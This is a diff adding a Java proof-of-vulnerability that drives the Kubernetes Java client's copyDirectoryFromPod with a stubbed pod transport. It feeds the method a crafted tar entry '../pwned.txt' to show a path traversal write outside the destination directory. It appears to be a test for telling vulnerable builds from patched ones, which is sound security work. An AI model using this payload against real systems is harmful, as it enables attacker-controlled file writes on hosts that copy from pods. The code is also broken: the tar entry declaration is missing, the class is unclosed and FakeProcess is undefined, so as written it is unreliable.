+/*
+ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in
+ * io.kubernetes.client.Copy#copyDirectoryFromPod.
+ *
+ * The method extracts a tar archive received from a (potentially malicious) pod
+ * and, for each entry, does:
+ *
+ *     File f = new File(destination.toFile(), entry.getName());
+ *
+ * The archive entry name is fully attacker-controlled. When it contains a
+ * traversal sequence such as "../pwned.txt", the resulting File escapes the
+ * intended destination directory and is written outside of it.
+ *
+ * This POV drives the REAL Copy.copyDirectoryFromPod code. Only the transport
+ * layer (Exec#exec, which normally talks to the Kubernetes API server) is
+ * overridden so that we can feed a controlled malicious archive - exactly the
+ * bytes a hostile pod would return over `tar cz - <path> | base64`.
+ *
+ * Exit code:
+ *   0  -> traversal succeeded, a file was written OUTSIDE the destination dir
+ *         (vulnerable / unpatched behaviour)
+ *   1  -> traversal was prevented (no file escaped the destination dir)
+ *         (patched behaviour)
+ */
+import io.kubernetes.client.Copy;
+import io.kubernetes.client.openapi.ApiClient;
+
+import org.apache.commons.codec.binary.Base64OutputStream;
+import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
+import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;
+import org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.nio.file.Files;
+import java.nio.file.Path;
+
+public class CopyPathTraversalPov {
+
+  /** The entry name a malicious pod would place inside the tar stream. */
+  private static final String MALICIOUS_ENTRY = "../pwned.txt";
+  private static final byte[] MALICIOUS_CONTENT =
+      "path-traversal-payload".getBytes();
+
+  public static void main(String[] args) throws Exception {
+    // Layout:
+    //   base/          <- temp root
+    //   base/dest/     <- the "destination" passed to copyDirectoryFromPod
+    // A correct implementation must keep every written file under base/dest.
+    Path base = Files.createTempDirectory("pov-copy-base");
+    Path dest = base.resolve("dest");
+    Files.createDirectories(dest);
+
+    // Where a successful traversal would land: base/pwned.txt (a sibling of dest).
+    File escaped = base.resolve("pwned.txt").toFile();
+    if (escaped.exists()) {
+      escaped.delete();
+    }
+
+    final byte[] maliciousArchive =
+        buildBase64GzipTar(MALICIOUS_ENTRY, MALICIOUS_CONTENT);
+
+    // Override ONLY the transport. Everything else is the real Copy code path.
+    Copy copy =
+        new Copy(new ApiClient()) {
+          @Override
+          public Process exec(
+              String namespace,
+              String name,
+              String[] command,
+              String container,
+              boolean stdin,
+              boolean tty) {
+            String shellCmd = command[command.length - 1];
+            if (shellCmd.contains("tar --version")) {
+              // isTarPresentInContainer(): any exit status != 127 means "tar present".
+              return new FakeProcess(new byte[0], 0);
+            }
+            // The real "tar cz - <srcPath> | base64" call: return the attacker archive.
+            return new FakeProcess(maliciousArchive, 0);
+          }
+        };
+
+    try {
+      copy.copyDirectoryFromPod("default", "apod", "container", "/data", dest);
+    } catch (Exception e) {
+      // A hardened implementation may reject the malicious entry by throwing.
+      System.out.println("copyDirectoryFromPod threw: " + e);
+    }
+
+    boolean escapedCanonicalCheck = false;
+    if (escaped.exists()) {
+      String destCanon = dest.toFile().getCanonicalPath() + File.separator;
+      String escapedCanon = escaped.getCanonicalPath();
+      escapedCanonicalCheck = !escapedCanon.startsWith(destCanon);
+      System.out.println("Wrote file: " + escapedCanon);
+      System.out.println("Destination dir: " + dest.toFile().getCanonicalPath());
+    }
+
+    if (escaped.exists() && escapedCanonicalCheck) {
+      System.out.println(
+          "VULNERABLE: archive entry '"
+              + MALICIOUS_ENTRY
+              + "' escaped the destination directory (path traversal).");
+      System.exit(0);
+    }
+
+    System.out.println(
+        "NOT VULNERABLE: no file was written outside the destination directory.");
+    System.exit(1);
+  }
+
+  /** Produces base64( gzip( tar[entryName] ) ), matching what Copy expects to read. */
+  private static byte[] buildBase64GzipTar(String entryName, byte[] content)
+      throws Exception {
+    ByteArrayOutputStream out = new ByteArrayOutputStream();
+    // Base64OutputStream(out, true) => encode on write.
+    Base64OutputStream b64 = new Base64OutputStream(out, true);
+    GzipCompressorOutputStream gz = new GzipCompressorOutputStream(b64);
+    TarArchiveOutputStream tar = new TarArchiveOutputStream(gz);
+    tar.setLongFileMode(TarArchiveOutputStream.LONGFILE_GNU);
+

+    entry.setSize(content.length);
+    tar.putArchiveEntry(entry);
+    tar.write(content);
+    tar.closeArchiveEntry();
+
+    tar.finish();
+    tar.close(); // cascades close() through gz and b64 to out
+    return out.toByteArray();
+  }
